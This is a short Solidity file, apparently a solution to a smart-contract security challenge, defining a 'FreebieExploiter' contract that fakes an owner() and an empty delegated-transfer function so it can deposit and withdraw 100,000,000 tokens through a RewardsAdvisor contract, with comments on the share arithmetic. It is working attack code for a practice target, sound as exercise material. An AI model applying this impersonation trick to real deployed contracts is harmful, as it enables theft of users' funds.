// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "./RewardsAdvisor.sol";
import "../other/Token.sol";
import "./GovToken.sol";

contract FreebieExploiter {
    RewardsAdvisor rewardsAdvisor;

    constructor (address _rewardsAdvisor) {
        rewardsAdvisor = RewardsAdvisor(_rewardsAdvisor);
    }

    function exploit() public {
        rewardsAdvisor.deposit(100_000_000e18, payable(address(this)), address(this));
        rewardsAdvisor.withdraw(100_000_000e18, msg.sender, payable(address(this)));
    }

    // Due to the mint / burn constraint we are left with this equation:
    // 10_000 = (10_000 * x) / (10_000 + x)
    // This equation doesn't have solution for X
    // But if we send 1 FARM with a simple transfer, it has, for 100,000,000 shares as input:
    // https://chat.openai.com/share/a618bb01-3354-4d3f-817a-97c7eb1b60a9

    function delegatedTransferERC20(address, address, uint256) public {}

    function owner() public view returns (address) {
        return address(this);
    }

}